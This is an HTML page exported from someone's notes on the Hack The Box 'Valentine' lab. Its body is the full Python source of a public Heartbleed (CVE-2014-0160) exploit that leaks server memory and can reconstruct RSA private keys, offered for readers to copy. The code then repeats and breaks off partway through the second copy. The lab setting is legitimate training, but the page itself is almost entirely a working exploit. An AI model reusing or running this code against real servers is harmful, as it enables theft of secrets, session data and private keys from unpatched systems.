<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>heartbleed.py sourcecode</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--valentine.html">valentine</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---index.html">/index</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev.html">/dev</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key.html">hype_key</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--hex_to_ascii.html">hex to ascii</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--vi_hype_key.html">vi hype_key</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--notes.txt.html">notes.txt</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---encode.html">/encode</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---decode.html">/decode</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---omg.html">/omg</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed.html">initial foothold w/ heartbleed</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--Heartbleed_concept_comic.html">Heartbleed concept comic</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py.html">vi heartbleed.py</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py--heartbleed.py_sourcecode.html">heartbleed.py sourcecode</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed.html">run heartbleeed</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--usage.html">usage </a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20.html">heartbleed.py <target ip> -n 20</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--interesting_finds.html">interesting finds</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--base_64_text.html">base 64 text</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--ssh_-i_hype_key_hype@10.10.10.79.html">ssh -i hype_key hype@10.10.10.79</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--linux_smart_enumeration.html">linux smart enumeration</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes.html">notes</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--ps_-ef__grep_root.html">ps -ef | grep root</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--log_onto_root_tmux_session.html">log onto root tmux session</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--valentine--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--valentine--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>heartbleed.py sourcecode</u></b></h1><span style="color:#24ff00;">for anyone interested in reading the code or too lazy to download it off the web, feel free to take it from here</span>:<br /><br />#!/usr/bin/python<br /><br /># Modified by Travis Lee<br /># Last Updated: 4/21/14<br /># Version 1.16<br />#<br /># -changed output to display text only instead of hexdump and made it easier to read<br /># -added option to specify number of times to connect to server (to get more data)<br /># -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc... <br /># -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port)<br /># -added option to have verbose output<br /># -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command <br /># -added option for hex output<br /># -added option to output raw data to a file<br /># -added option to output ascii data to a file<br /># -added option to not display returned data on screen (good if doing many iterations and outputting to a file)<br /># -added tls version auto-detection<br /># -added an extract rsa private key mode (orig code from epixoip. will exit script when found and enables -d (do not display returned data on screen)<br />#  -requires following modules: gmpy, pyasn1<br /><br /># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)<br /># The author disclaims copyright to this source code.<br /><br />import sys<br />import struct<br />import socket<br />import time<br />import select<br />import re<br />import time<br />import os<br />from optparse import OptionParser<br /><br />options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')<br />options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')<br />options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')<br />options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')<br />options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')<br />options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')<br />options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')<br />options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')<br />options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')<br />options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')<br />options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')<br /><br />opts, args = options.parse_args()<br /><br />if opts.extractkey:<br />    import base64, gmpy<br />    from pyasn1.codec.der import encoder<br />    from pyasn1.type.univ import *<br /><br />def hex2bin(arr):<br />    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')<br /><br />tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}<br /><br />def build_client_hello(tls_ver):<br />    client_hello = [<br /># TLS header ( 5 bytes)<br />0x16,               # Content type (0x16 for handshake)<br />0x03, tls_ver,         # TLS Version<br />0x00, 0xdc,         # Length<br /># Handshake header<br />0x01,               # Type (0x01 for ClientHello)<br />0x00, 0x00, 0xd8,   # Length<br />0x03, tls_ver,         # TLS Version<br /># Random (32 byte)<br />0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,<br />0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,<br />0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,<br />0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,<br />0x00,               # Session ID length<br />0x00, 0x66,         # Cipher suites length<br /># Cipher suites (51 suites)<br />0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,<br />0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,<br />0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,<br />0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,<br />0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,<br />0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,<br />0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,<br />0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,<br />0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,<br />0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,<br />0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,<br />0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,<br />0x00, 0x06, 0x00, 0x03, 0x00, 0xff,<br />0x01,               # Compression methods length<br />0x00,               # Compression method (0x00 for NULL)<br />0x00, 0x49,         # Extensions length<br /># Extension: ec_point_formats<br />0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,<br /># Extension: elliptic_curves<br />0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,<br />0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,<br />0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,<br />0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,<br />0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,<br />0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,<br />0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,<br /># Extension: SessionTicket TLS<br />0x00, 0x23, 0x00, 0x00,<br /># Extension: Heartbeat<br />0x00, 0x0f, 0x00, 0x01, 0x01<br />    ]<br />    return client_hello<br />    <br />def build_heartbeat(tls_ver):<br />    heartbeat = [<br />0x18,       # Content Type (Heartbeat)<br />0x03, tls_ver,  # TLS version<br />0x00, 0x03,  # Length<br /># Payload<br />0x01,       # Type (Request)<br />0x40, 0x00  # Payload length<br />    ] <br />    return heartbeat<br /><br /><br />if opts.rawoutfile:<br />    rawfileOUT = open(opts.rawoutfile, "a")<br /><br />if opts.asciioutfile:<br />    asciifileOUT = open(opts.asciioutfile, "a")<br />    <br />if opts.extractkey:<br />    opts.donotdisplay = True<br />    <br />def hexdump(s):<br />    pdat = ''<br />    hexd = ''<br />    for b in xrange(0, len(s), 16):<br />        lin = [c for c in s[b : b + 16]]<br />        if opts.hexdump:<br />            hxdat = ' '.join('%02X' % ord(c) for c in lin)<br />            pdat = ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin)<br />            hexd += '  %04x: %-48s %s\n' % (b, hxdat, pdat)<br />        else:<br />            pdat += ''.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)<br />    if opts.hexdump:<br />	    return hexd<br />    else:<br />        pdat = re.sub(r'([.]{50,})', '', pdat)<br />        if opts.asciioutfile:<br />            asciifileOUT.write(pdat)<br />        return pdat<br /><br />def rcv_tls_record(s):<br />    try:<br />        tls_header = s.recv(5)<br />        if not tls_header:<br />            print 'Unexpected EOF (header)' <br />            return None,None,None        <br />        typ,ver,length = struct.unpack('&gt;BHH',tls_header)<br />        message = ''<br />        while len(message) != length:<br />            message += s.recv(length-len(message))<br />        if not message:<br />            print 'Unexpected EOF (message)'<br />            return None,None,None<br />        if opts.verbose:<br />	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)<br />        return typ,ver,message<br />    except Exception as e:<br />        print "\nError Receiving Record! " + str(e)<br />        return None,None,None<br /><br />def hit_hb(s, targ, firstrun, supported):<br />    s.send(hex2bin(build_heartbeat(supported)))<br />    while True:<br />        typ, ver, pay = rcv_tls_record(s)<br />        if typ is None:<br />            print 'No heartbeat response received, server likely not vulnerable'<br />            return ''<br /><br />        if typ == 24:<br />            if opts.verbose:<br />                print 'Received heartbeat response...'<br />            if len(pay) &gt; 3:<br />                if firstrun or opts.verbose:<br />                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'<br />                if opts.rawoutfile:<br />                    rawfileOUT.write(pay)<br />                if opts.extractkey:<br />                	return pay<br />                else:<br />	                return hexdump(pay)<br />            else:<br />                print 'Server processed malformed heartbeat, but did not return any extra data.'<br /><br />        if typ == 21:<br />            print 'Received alert:'<br />            return hexdump(pay)<br />            print 'Server returned error, likely not vulnerable'<br />            return ''<br /><br /><br />def conn(targ, port):<br />    try:<br />        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />        sys.stdout.flush()<br />        s.settimeout(10)<br />        #time.sleep(0.2)<br />        s.connect((targ, port))<br />        return s<br /><br />    except Exception as e:<br />       print "Connection Error! " + str(e)<br />       return None<br />       <br />def bleed(targ, port):<br />    try:<br />        res = ''<br />        firstrun = True<br />        print '\n##################################################################'<br />        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'<br />        for x in range(0, opts.num):<br />            if x &gt; 0:<br />                firstrun = False<br />            <br />            if x == 0 and opts.extractkey:<br />                print "Attempting to extract private key from returned data..."<br />                if not os.path.exists('./hb-certs'):<br />                    os.makedirs('./hb-certs')<br />                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'<br />                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 &gt; hb-certs/sslcert_' + targ + '.pem')	<br />                print '\nExtracting modulus from cert...\n'<br />                os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem &gt; hb-certs/sslcert_' + targ + '_pubkey.pem')<br />                output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')<br />                modulus = output.read()<br />            <br />            s = conn(targ, port)<br />            if not s:<br />                continue<br /><br />            # send starttls command if specified as an option or if common smtp/pop3/imap ports are used<br />            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):<br />                <br />                stls = False<br />                atls = False<br />                <br />                # check if smtp supports starttls/stls<br />                if port in {25, 587}:<br />                    print 'SMTP Port... Checking for STARTTLS Capability...'<br />                    check = s.recv(1024)<br />                    s.send("EHLO someone.org\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                                        <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "STLS" in check:<br />                        opts.starttls = True<br />                        stls = True<br />                        print "STLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                <br />                # check if pop3/imap supports starttls/stls                            <br />                elif port in {110, 143}:<br />                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'<br />                    check = s.recv(1024)<br />                    if port == 110:<br />                        s.send("CAPA\n")<br />                    if port == 143:<br />                        s.send("CAPABILITY\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                                           <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "STLS" in check:<br />                        opts.starttls = True<br />                        stls = True<br />                        print "STLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                        <br />                # check if ftp supports auth tls/starttls                          <br />                elif port in {21}:<br />                    print 'FTP Port... Checking for AUTH TLS Capability...'<br />                    check = s.recv(1024)<br />                    s.send("FEAT\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                        <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "AUTH TLS" in check:<br />                        opts.starttls = True<br />                        atls = True<br />                        print "AUTH TLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                                        <br />                # send appropriate tls command if supported                        <br />                if opts.starttls:       <br />                    sys.stdout.flush()<br />                    if stls:<br />                        print 'Sending STLS Command...'<br />                        s.send("STLS\n")<br />                    elif atls:<br />                        print 'Sending AUTH TLS Command...'<br />                        s.send("AUTH TLS\n")<br />                    else:<br />                        print 'Sending STARTTLS Command...'<br />                        s.send("STARTTLS\n")<br />                    if opts.verbose:<br />                        print 'Waiting for reply...'<br />                    sys.stdout.flush()<br />                    rcv_tls_record(s)<br /><br />            supported = False<br />            for num,tlsver in tls_versions.items():<br />                <br />                if firstrun:<br />                    print 'Sending Client Hello for {}'.format(tlsver)<br />                s.send(hex2bin(build_client_hello(num)))<br />                <br />                if opts.verbose:<br />                    print 'Waiting for Server Hello...'<br />                <br />                while True:<br />                    typ,ver,message = rcv_tls_record(s)<br />                    if not typ:<br />                        if opts.verbose:<br />                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)<br />                        s.close()<br />                        s = conn(targ, port)<br />                        break<br />                    if typ == 22 and ord(message[0]) == 0x0E:<br />                        if firstrun:<br />                            print 'Received Server Hello for {}'.format(tlsver)<br />                        supported = True<br />                        break<br />                if supported: break<br /><br />            if not supported:<br />                print '\nError! No TLS versions supported!'<br />                print '##################################################################'<br />                return<br /><br />            if opts.verbose:<br />                print '\nSending heartbeat request...'<br />            sys.stdout.flush()<br />            <br />            keyfound = False<br />            if opts.extractkey:<br />            	res = hit_hb(s, targ, firstrun, supported)<br />            	if res == '':<br />            	    continue<br />            	keyfound = extractkey(targ, res, modulus)<br />            else:<br />	            res += hit_hb(s, targ, firstrun, supported)<br />            s.close()<br />            if keyfound:<br />                sys.exit(0)<br />            else:<br />                sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))<br />                sys.stdout.flush()<br />        <br />        print '\n##################################################################'<br />        print       <br />        return res<br />    <br />    except Exception as e:<br />       print "Error! " + str(e)<br />       print '##################################################################'<br />       print               <br /><br />def extractkey(host, chunk, modulus):<br />	<br />    #print "\nChecking for private key...\n"<br />    n = int (modulus, 16)<br />    keysize = n.bit_length() / 16<br /><br />    for offset in xrange (0, len (chunk) - keysize):<br />        p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)<br />        if gmpy.is_prime (p) and p != n and n % p == 0:<br />            if opts.verbose:<br />                print '\n\nFound prime: ' + str(p)<br />            e = 65537<br />            q = n / p<br />            phi = (p - 1) * (q - 1)<br />            d = gmpy.invert (e, phi)<br />            dp = d % (p - 1)<br />            dq = d % (q - 1)<br />            qinv = gmpy.invert (q, p)<br />            seq = Sequence()<br />            for x in [0, n, e, d, p, q, dp, dq, qinv]:<br />                seq.setComponentByPosition (len (seq), Integer (x))<br />            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))<br />            privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")<br />            privkeydump.write(chunk)<br />            return True<br />        else:<br />            return False<br /><br />def main():<br /><br />    print "\ndefribulator v1.16"<br />    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"<br />    allresults = ''<br />                    <br />    # if a file is specified, loop through file<br />    if opts.filein:<br />        fileIN = open(opts.filein, "r")<br />        <br />        for line in fileIN:<br />            targetinfo = line.strip().split(":")<br />            if len(targetinfo) &gt; 1:<br />                allresults = bleed(targetinfo[0], int(targetinfo[1]))<br />            else:<br />                allresults = bleed(targetinfo[0], opts.port)<br />            <br />            if allresults and (not opts.donotdisplay):<br />                print '%s' % (allresults)<br /><br />        fileIN.close()<br /><br />    else:<br />        if len(args) &lt; 1:<br />            options.print_help()<br />            return<br />        allresults = bleed(args[0], opts.port)<br />        if allresults and (not opts.donotdisplay):<br />            print '%s' % (allresults)<br />    <br />    print<br />    <br />    if opts.rawoutfile:<br />        rawfileOUT.close()<br />    <br />    if opts.asciioutfile:<br />        asciifileOUT.close()<br />            <br />if __name__ == '__main__':<br />    main()<br />#!/usr/bin/python<br /><br /># Modified by Travis Lee<br /># Last Updated: 4/21/14<br /># Version 1.16<br />#<br /># -changed output to display text only instead of hexdump and made it easier to read<br /># -added option to specify number of times to connect to server (to get more data)<br /># -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc... <br /># -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port)<br /># -added option to have verbose output<br /># -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command <br /># -added option for hex output<br /># -added option to output raw data to a file<br /># -added option to output ascii data to a file<br /># -added option to not display returned data on screen (good if doing many iterations and outputting to a file)<br /># -added tls version auto-detection<br /># -added an extract rsa private key mode (orig code from epixoip. will exit script when found and enables -d (do not display returned data on screen)<br />#  -requires following modules: gmpy, pyasn1<br /><br /># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)<br /># The author disclaims copyright to this source code.<br /><br />import sys<br />import struct<br />import socket<br />import time<br />import select<br />import re<br />import time<br />import os<br />from optparse import OptionParser<br /><br />options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')<br />options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')<br />options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')<br />options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')<br />options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')<br />options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')<br />options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')<br />options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')<br />options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')<br />options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')<br />options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')<br /><br />opts, args = options.parse_args()<br /><br />if opts.extractkey:<br />    import base64, gmpy<br />    from pyasn1.codec.der import encoder<br />    from pyasn1.type.univ import *<br /><br />def hex2bin(arr):<br />    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')<br /><br />tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}<br /><br />def build_client_hello(tls_ver):<br />    client_hello = [<br /># TLS header ( 5 bytes)<br />0x16,               # Content type (0x16 for handshake)<br />0x03, tls_ver,         # TLS Version<br />0x00, 0xdc,         # Length<br /># Handshake header<br />0x01,               # Type (0x01 for ClientHello)<br />0x00, 0x00, 0xd8,   # Length<br />0x03, tls_ver,         # TLS Version<br /># Random (32 byte)<br />0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,<br />0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,<br />0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,<br />0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,<br />0x00,               # Session ID length<br />0x00, 0x66,         # Cipher suites length<br /># Cipher suites (51 suites)<br />0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,<br />0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,<br />0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,<br />0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,<br />0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,<br />0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,<br />0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,<br />0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,<br />0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,<br />0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,<br />0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,<br />0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,<br />0x00, 0x06, 0x00, 0x03, 0x00, 0xff,<br />0x01,               # Compression methods length<br />0x00,               # Compression method (0x00 for NULL)<br />0x00, 0x49,         # Extensions length<br /># Extension: ec_point_formats<br />0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,<br /># Extension: elliptic_curves<br />0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,<br />0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,<br />0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,<br />0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,<br />0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,<br />0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,<br />0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,<br /># Extension: SessionTicket TLS<br />0x00, 0x23, 0x00, 0x00,<br /># Extension: Heartbeat<br />0x00, 0x0f, 0x00, 0x01, 0x01<br />    ]<br />    return client_hello<br />    <br />def build_heartbeat(tls_ver):<br />    heartbeat = [<br />0x18,       # Content Type (Heartbeat)<br />0x03, tls_ver,  # TLS version<br />0x00, 0x03,  # Length<br /># Payload<br />0x01,       # Type (Request)<br />0x40, 0x00  # Payload length<br />    ] <br />    return heartbeat<br /><br /><br />if opts.rawoutfile:<br />    rawfileOUT = open(opts.rawoutfile, "a")<br /><br />if opts.asciioutfile:<br />    asciifileOUT = open(opts.asciioutfile, "a")<br />    <br />if opts.extractkey:<br />    opts.donotdisplay = True<br />    <br />def hexdump(s):<br />    pdat = ''<br />    hexd = ''<br />    for b in xrange(0, len(s), 16):<br />        lin = [c for c in s[b : b + 16]]<br />        if opts.hexdump:<br />            hxdat = ' '.join('%02X' % ord(c) for c in lin)<br />            pdat = ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin)<br />            hexd += '  %04x: %-48s %s\n' % (b, hxdat, pdat)<br />        else:<br />            pdat += ''.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)<br />    if opts.hexdump:<br />	    return hexd<br />    else:<br />        pdat = re.sub(r'([.]{50,})', '', pdat)<br />        if opts.asciioutfile:<br />            asciifileOUT.write(pdat)<br />        return pdat<br /><br />def rcv_tls_record(s):<br />    try:<br />        tls_header = s.recv(5)<br />        if not tls_header:<br />            print 'Unexpected EOF (header)' <br />            return None,None,None        <br />        typ,ver,length = struct.unpack('&gt;BHH',tls_header)<br />        message = ''<br />        while len(message) != length:<br />            message += s.recv(length-len(message))<br />        if not message:<br />            print 'Unexpected EOF (message)'<br />            return None,None,None<br />        if opts.verbose:<br />	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)<br />        return typ,ver,message<br />    except Exception as e:<br />        print "\nError Receiving Record! " + str(e)<br />        return None,None,None<br /><br />def hit_hb(s, targ, firstrun, supported):<br />    s.send(hex2bin(build_heartbeat(supported)))<br />    while True:<br />        typ, ver, pay = rcv_tls_record(s)<br />        if typ is None:<br />            print 'No heartbeat response received, server likely not vulnerable'<br />            return ''<br /><br />        if typ == 24:<br />            if opts.verbose:<br />                print 'Received heartbeat response...'<br />            if len(pay) &gt; 3:<br />                if firstrun or opts.verbose:<br />                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'<br />                if opts.rawoutfile:<br />                    rawfileOUT.write(pay)<br />                if opts.extractkey:<br />                	return pay<br />                else:<br />	                return hexdump(pay)<br />            else:<br />                print 'Server processed malformed heartbeat, but did not return any extra data.'<br /><br />        if typ == 21:<br />            print 'Received alert:'<br />            return hexdump(pay)<br />            print 'Server returned error, likely not vulnerable'<br />            return ''<br /><br /><br />def conn(targ, port):<br />    try:<br />        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />        sys.stdout.flush()<br />        s.settimeout(10)<br />        #time.sleep(0.2)<br />        s.connect((targ, port))<br />        return s<br /><br />    except Exception as e:<br />       print "Connection Error! " + str(e)<br />       return None<br />       <br />def bleed(targ, port):<br />    try:<br />        res = ''<br />        firstrun = True<br />        print '\n##################################################################'<br />        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'<br />        for x in range(0, opts.num):<br />            if x &gt; 0:<br />                firstrun = False<br />            <br />            if x == 0 and opts.extractkey:<br />                print "Attempting to extract private key from returned data..."<br />                if not os.path.exists('./hb-certs'):<br />                    os.makedirs('./hb-certs')<br />                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'<br />                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 &gt; hb-certs/sslcert_' + targ + '.pem')	<br />                print '\nExtracting modulus from cert...\n'<br />                os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem &gt; hb-certs/sslcert_' + targ + '_pubkey.pem')<br />                output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')<br />                modulus = output.read()<br />            <br />            s = conn(targ, port)<br />            if not s:<br />                continue<br /><br />            # send starttls command if specified as an option or if common 